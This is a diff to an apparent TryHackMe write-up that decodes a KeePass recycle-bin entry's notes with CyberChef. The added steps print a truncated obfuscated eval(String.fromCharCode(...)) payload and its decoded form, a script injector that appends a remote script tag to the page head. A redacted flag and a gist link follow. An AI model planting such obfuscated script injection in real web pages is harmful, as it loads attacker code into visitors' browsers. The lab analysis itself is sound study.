@@ -44,3 +44,15 @@ We'll use [CyberChef](https://gchq.github.io/CyberChef/) also.
 	- Switch Keepass tab to see Recycle Bin entries.
 	- Open the unique entry.
 	- The password shown in cleartext without bullets is `nothinghere`. Mhh...
+	- Let's read the notes.
+	
+	
+	   eval(String.fromCharCode(118, 97, 114, 32, 115,44, 32, 49, 49, 53, 44, 32, 53,... [ ... ] ..., 53, 54, 44, 32, 57, 56, 44, 32, 15, 111, 109, 101, 115, 116, 114, 105, 110, 103, 41, 59, 32, 125));
+	
+	- Put this in CyberCHEF Input and take as recipe `From CharCode`, delimiter `comma`, base `10`.
+	
+	   .ar somestring = document.createElement('script'); somestring.type = 'text/javascript'; somestring.async = true;somestring.src = String.fromCharCode(104, 104, 116, 116, 112, ... [ ... ] ..., 22, 97, 47);   var alls = document.getElementsByTagName('script'); var nt3 = true; for ( var i = alls.length; i--;) { if (alls[i].src.indexOf(String.fromCharCode(49, 49, 100, 51,... [ ... ] ... 56, 98, 56)) > -1) { nt3 = false;} } if(nt3 == true){document.getElementsByTagName("head")[0].appendChild(somestring); }
+	
+	- Let's add another rule to the recipe, the same as before. It's seems there are things to be evaluated twice.
+	- `.https://gist.github.com/heavenraiza/1d321244c4**********d9a3298a88b8`
+	- `THM{********************************}`
